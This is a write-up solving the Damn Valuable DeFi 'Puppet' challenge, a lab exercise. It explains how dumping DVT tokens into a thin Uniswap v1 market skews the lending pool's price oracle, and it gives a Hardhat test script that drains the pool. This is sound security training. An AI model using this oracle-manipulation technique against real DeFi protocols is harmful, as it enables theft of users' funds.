# Intro

There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.

There’s a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.

Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance.

# Attack explanation

Our objective is to take all the tokens from the lending pool. In order to beat the level, we need to:

1. Manipulate the Uniswap Exchange returned price.

   - The price of the token will go down as the balance goes up.
   - We can send all of our DVT tokens to the Uniswap DVT market.
   - We own 1000 DVTs, 2 order of magnitude higher than the 10 DVT liquidity of the Uniswap market. We can manipulate it with ease.

2. Borrow DVT tokens cheap.

# Attack function

We can create the following attacker script to make the attack:

```
  it("Exploit", async function () {
    // Approve tokens
    await this.token
      .connect(attacker)
      .approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);

    const now = Math.floor(new Date().getTime() / 1000);

    // Sell tokens to get ETH. The price of the token will go down as the balance goes up.
    //  _computeOraclePrice function will return a lower value and we will borrow cheap.
    await this.uniswapExchange
      .connect(attacker)
      .tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 1, now + 1000);

    // Calculate deposit required to send as value in borrow tx.
    const deposit = await this.lendingPool.calculateDepositRequired(
      POOL_INITIAL_TOKEN_BALANCE
    );

    // Borrow all tokens from the lending pool, sending the deposit required.
    await this.lendingPool
      .connect(attacker)
      .borrow(POOL_INITIAL_TOKEN_BALANCE, { value: deposit });
  });
```
